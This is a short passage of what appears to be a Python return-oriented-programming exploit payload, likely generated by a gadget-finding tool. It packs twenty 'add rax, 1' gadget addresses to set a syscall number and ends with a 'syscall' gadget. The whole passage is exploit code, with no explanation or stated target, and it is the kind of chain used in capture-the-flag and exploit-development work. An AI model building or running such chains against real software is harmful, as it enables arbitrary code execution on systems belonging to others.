	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000461645) # syscall ; ret
